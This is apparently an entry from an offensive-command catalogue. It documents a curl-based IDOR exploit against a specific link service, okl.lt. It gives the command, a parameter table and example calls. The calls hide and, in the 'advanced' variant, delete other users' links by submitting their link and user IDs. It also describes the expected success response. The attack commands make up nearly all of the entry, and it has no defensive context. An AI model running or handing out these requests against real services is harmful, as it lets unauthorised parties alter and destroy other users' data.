---
data: >-
  curl -X POST 'https://okl.lt/api/hide-link' -H 'Authorization: Bearer
  YOUR_TOKEN' -H 'Content-Type: application/json' -d '{"link_id":
  "TARGET_LINK_ID", "user_id": "TARGET_USER_ID"}'
tags:
  - web
  - api
  - exploitation
  - idor
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: ed4aae35-b09d-435e-96df-71032892a919
created_at: '2025-12-14T17:30:07.422Z'
updated_at: '2025-12-14T17:30:07.422Z'
verified: false
validated: true
submitted: true
---
# curl-hide-link-idor

## Command

```bash
curl -X POST 'https://okl.lt/api/hide-link' -H 'Authorization: Bearer YOUR_TOKEN' -H 'Content-Type: application/json' -d '{"link_id": "TARGET_LINK_ID", "user_id": "TARGET_USER_ID"}'
```

## Description

This command exploits the IDOR vulnerability by sending a hide request to okl.lt with a mismatched user ID, allowing manipulation of other users' links.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies the HTTP method | Yes |
| `'https://okl.lt/api/hide-link'` | Target endpoint URL | Yes |
| `-H 'Authorization: Bearer YOUR_TOKEN'` | Authentication header | Yes |
| `-H 'Content-Type: application/json'` | JSON content type | Yes |
| `-d '{"link_id": "TARGET_LINK_ID", "user_id": "TARGET_USER_ID"}'` | Payload with target IDs | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'https://okl.lt/api/hide-link' -H 'Authorization: Bearer abc123' -H 'Content-Type: application/json' -d '{"link_id": "targetLink789", "user_id": "targetUser456"}'
```

### Advanced Usage

For deletion, modify endpoint:

```bash
curl -X POST 'https://okl.lt/api/delete-link' -H 'Authorization: Bearer abc123' -H 'Content-Type: application/json' -d '{"link_id": "targetLink789", "user_id": "targetUser456"}'
```

## Expected Output

Successful response: {"status": "success"}. Failure may return 403 or 500 if checks are in place.

## Related

- [[Related Procedure]]
